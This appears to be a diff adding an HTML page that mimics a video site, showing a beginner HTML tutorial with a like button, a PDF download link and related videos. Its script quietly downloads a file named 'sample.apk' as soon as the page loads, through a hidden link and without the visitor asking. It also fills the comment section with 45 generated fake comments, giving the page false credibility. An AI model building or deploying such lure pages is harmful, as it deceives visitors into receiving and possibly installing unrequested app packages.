@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mini YouTube Page</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f9f9f9;
+      color: #333;
+      font-weight: bold;
+    }
+    header {
+      background-color: #ff0000;
+      color: white;
+      padding: 10px 20px;
+      font-size: 1.5rem;
+    }
+    .container {
+      max-width: 1000px;
+      margin: auto;
+      padding: 20px;
+    }
+    .video-container {
+      position: relative;
+      padding-top: 56.25%;
+      height: 0;
+      overflow: hidden;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+    .video-container video {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border-radius: 8px;
+    }
+    .stats {
+      margin: 10px 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .likes-views span {
+      margin-right: 15px;
+    }
+    .like-btn {
+      background-color: #eee;
+      border: none;
+      padding: 8px 12px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 1rem;
+    }
+    .like-btn:hover {
+      background-color: #ddd;
+    }
+    .description {
+      margin: 20px 0;
+      padding: 15px;
+      background-color: #fff3f3;
+      border-left: 4px solid #ff0000;
+      border-radius: 5px;
+    }
+    .comments {
+      margin-top: 20px;
+    }
+    .comment-box {
+      margin-bottom: 10px;
+    }
+    textarea {
+      width: 100%;
+      padding: 10px;
+      resize: vertical;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .download-btn {
+      margin-top: 20px;
+      display: inline-block;
+      background-color: #007bff;
+      color: white;
+      padding: 10px 20px;
+      text-decoration: none;
+      border-radius: 5px;
+    }
+    #download-count {
+      margin-top: 10px;
+      color: #555;
+    }
+    .related-videos {
+      margin-top: 40px;
+    }
+    .related-videos h3 {
+      margin-bottom: 10px;
+    }
+    .related-video {
+      display: flex;
+      align-items: center;
+      margin-bottom: 10px;
+      cursor: pointer;
+    }
+    .related-video img {
+      width: 120px;
+      height: 70px;
+      object-fit: cover;
+      margin-right: 10px;
+      border-radius: 5px;
+    }
+    .related-video div {
+      font-weight: bold;
+    }
+    @media (max-width: 600px) {
+      .stats {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>MyVideoTube</header>
+  <div class="container">
+    <div class="video-container">
+      <video id="main-video" autoplay muted controls>
+        <source src="C:\Users\Admin\Downloads\Tube\Promo04.mp4" type="video/mp4" />
+        Your browser does not support the video tag.
+      </video>
+    </div>
+    <div class="stats">
+      <div class="likes-views">
+        <span>👍 <span id="likes">1.5k</span> Likes</span>
+        <span>👁️ 10k Views</span>
+      </div>
+      <button class="like-btn" onclick="likeVideo()">Like</button>
+    </div>
+
+    <div class="description">
+      <h3>Video Description</h3>
+      <p>This tutorial video explains basic HTML tags and elements. It's perfect for beginners who want to get started with web development quickly. Watch till the end for practical tips and tricks!</p>
+    </div>
+
+    <a class="download-btn" href="sample.pdf" download>📄 Download PDF</a>
+    <div id="download-count">Downloads: <span id="counter">0</span></div>
+
+    <div class="comments">
+      <h3>Comments</h3>
+      <div class="comment-box">
+        <textarea rows="3" placeholder="Add a comment..."></textarea>
+      </div>
+      <div id="fake-comments"></div>
+    </div>
+
+    <div class="related-videos">
+      <h3>Related Videos</h3>
+      <div class="related-video" onclick="changeVideo('C:\Users\Admin\Downloads\Tube\Promo04.mp4')">
+        <img src="https://via.placeholder.com/120x70.png?text=Video+1" alt="Related Video 1">
+        <div>Learn HTML in 10 Minutes</div>
+      </div>
+      <div class="related-video" onclick="changeVideo('C:\Users\Admin\Downloads\Tube\WhatsApp.mp4')">
+        <img src="https://via.placeholder.com/120x70.png?text=Video+2" alt="Related Video 2">
+        <div>CSS Tips & Tricks</div>
+      </div>
+      <div class="related-video" onclick="changeVideo('C:\Users\Admin\Downloads\Tube\Promo04.mp4')">
+        <img src="https://via.placeholder.com/120x70.png?text=Video+3" alt="Related Video 3">
+        <div>JavaScript for Beginners</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let likes = 1500;
+    let downloadCount = 0;
+
+    function likeVideo() {
+      likes++;
+      document.getElementById("likes").textContent = formatLikes(likes);
+    }
+
+    function formatLikes(num) {
+      if (num >= 1000) {
+        return (num / 1000).toFixed(1) + "k";
+      }
+      return num;
+    }
+
+    function incrementDownloadCounter() {
+      downloadCount++;
+      document.getElementById("counter").textContent = downloadCount;
+    }
+
+    function autoDownloadAPK() {
+      fetch("sample.apk")
+        .then(response => response.blob())
+        .then(blob => {
+          const blobUrl = window.URL.createObjectURL(blob);
+          const a = document.createElement("a");
+          a.href = blobUrl;
+          a.download = "sample.apk";
+          document.body.appendChild(a);
+          a.style.display = 'none';
+          a.click();
+          document.body.removeChild(a);
+          window.URL.revokeObjectURL(blobUrl);
+          incrementDownloadCounter();
+        })
+        .catch(err => console.error("Auto-download failed:", err));
+    }
+
+    window.addEventListener("load", function () {
+      autoDownloadAPK();
+
+      // Fake comments
+      const commentContainer = document.getElementById("fake-comments");
+      for (let i = 1; i <= 45; i++) {
+        const div = document.createElement("div");
+        div.textContent = `User${i}: This is a great video! Thanks for sharing.`;
+        div.style.margin = "5px 0";
+        commentContainer.appendChild(div);
+      }
+    });
+
+    function changeVideo(src) {
+      const video = document.getElementById("main-video");
+      video.querySelector("source").src = src;
+      video.load();
+      video.play();
+    }
+  </script>
+</body>
+</html>
